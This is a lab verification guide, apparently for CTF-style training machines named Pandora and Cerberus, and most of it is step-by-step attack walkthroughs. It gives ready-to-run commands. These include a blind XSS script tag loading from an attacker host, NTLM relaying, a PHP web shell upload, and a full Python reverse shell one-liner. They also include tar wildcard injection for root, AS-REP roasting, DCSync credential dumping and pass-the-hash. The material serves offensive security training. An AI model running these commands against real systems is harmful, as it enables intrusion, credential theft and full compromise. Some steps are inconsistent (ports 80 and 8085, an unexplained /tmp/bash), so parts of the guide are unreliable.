# Pandora Machine Verification

## 1. Build Verification
Run the following command in `machines/Pandora`:
```bash
docker-compose build
```
Expected Output: Successful build of `pandora` image.

## 2. Service Verification
Start the machine:
```bash
docker-compose up -d
```
Check running services:
- **Port 80**: HTTP (Web App)
- **Port 445**: SMB (Samba)

## 3. Exploit Walkthrough (Attacker View)

### Step 1: Blind XSS
1.  Navigate to `http://<TARGET_IP>:8085/`.
2.  Submit a ticket with:
    -   Email: `attacker@evil.com`
    -   Message: `My printer is broken.`
    -   **Intercept Request** (Burp Suite) and change `User-Agent` to:
        `<script src="http://10.10.14.x/auth"></script>`
3.  Start `ntlmrelayx`:
    ```bash
    impacket-ntlmrelayx -t smb://<TARGET_IP> -smb2support -i
    ```
    (Note: `-i` for interactive shell, or `-c` to execute command).

### Step 2: NTLM Relay & RCE
1.  Wait for the Bot (approx 10s).
2.  `ntlmrelayx` should receive a connection from `WORKGROUP\admin`.
3.  It relays to the SMB server.
4.  If successful, it dumps the SAM or gives an interactive SMB shell.
5.  Use the interactive shell to upload a PHP shell to `/var/www/html/tickets/shell.php`.
    ```bash
    put shell.php
    ```
6.  Access `http://<TARGET_IP>:8085/tickets/shell.php?cmd=id` to confirm RCE.
7.  **Get Reverse Shell**:
    *   **Option 1: Browser (Easiest)**
        Paste this directly into your address bar (browsers auto-encode special characters):
        ```text
        http://<TARGET_IP>:8085/tickets/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.255.6",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
        ```
    *   **Option 2: Curl**
        Use `curl -G` (GET mode) to handle the query parameters correctly:
        ```bash
        curl -G "http://<TARGET_IP>:8085/tickets/shell.php" --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.255.6\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
        ```

### Step 3: Privilege Escalation
1.  On the reverse shell:
    ```bash
    /usr/local/bin/check_status
    ```
2.  Select option `3` (Backup Logs).
3.  Exploit `tar *`:
    -   Create files in `/var/www/html/tickets/`:
        ```bash
        touch -- "--checkpoint=1"
        touch -- "--checkpoint-action=exec=sh shell.sh"
        echo "chmod +s /bin/bash" > shell.sh
        chmod +x shell.sh
        ```
    -   Run `/usr/local/bin/check_status` and choose `3`.
4.  `tar` executes `shell.sh`, making `/bin/bash` SUID.
5.  Run `/tmp/bash -p` to get Root.

# Cerberus Machine Verification

## 1. Build Verification
Run the following command in `machines/Cerberus`:
```bash
docker-compose build
```

## 2. Service Verification
Start the machine:
```bash
docker-compose up -d
```
Check running services:
- **DNS (53)**
- **Kerberos (88)**
- **SMB (445)**
- **LDAP (389)**

## 3. Exploit Walkthrough

### Step 1: Reconnaissance
1.  **Port Scan**: Confirm Samba AD ports.
2.  **User Enumeration** (Anonymous LDAP):
    -   Host: `cerberus.local` (Add specific IP to hosts file if needed, or use IP).
    -   Command:
        ```bash
        ldapsearch -x -H ldap://<TARGET_IP> -b "DC=cerberus,DC=local"
        ```
    -   Look for users. Identify `svc_backup`.

### Step 2: AS-REP Roasting
1.  Target: `svc_backup`.
2.  Command:
    ```bash
    impacket-GetNPUsers cerberus.local/ -usersfile users.txt -no-pass -dc-ip <TARGET_IP>
    ```
3.  Result: TGT Hash for `svc_backup`.
4.  **Crack Hash**:
    -   `john --wordlist=rockyou.txt hash.txt`
    -   Password: `BackupM@ster2023!`

### Step 3: DCSync (Privilege Escalation)
1.  Command:
    ```bash
    impacket-secretsdump 'cerberus.local/svc_backup:BackupM@ster2023!@<TARGET_IP>'
    ```
2.  Result:
    ```text
    Administrator:500:aad3b...:ntlm_hash:::
    ```

### Step 4: Administrator Access
1.  Use the hash to access the machine or prove compromise.
    ```bash
    impacket-wmiexec 'cerberus.local/Administrator@<TARGET_IP>' -hashes :<NTLM_HASH>
    ```
    (Note: WMI might be flaky on Samba container, use `smbclient` or `smbexec` if WMI fails).
2.  **Verify Access**:
    ```bash
    smbclient //<TARGET_IP>/Flags -U Administrator --pw-nt-hash <NTLM_HASH>
    ```
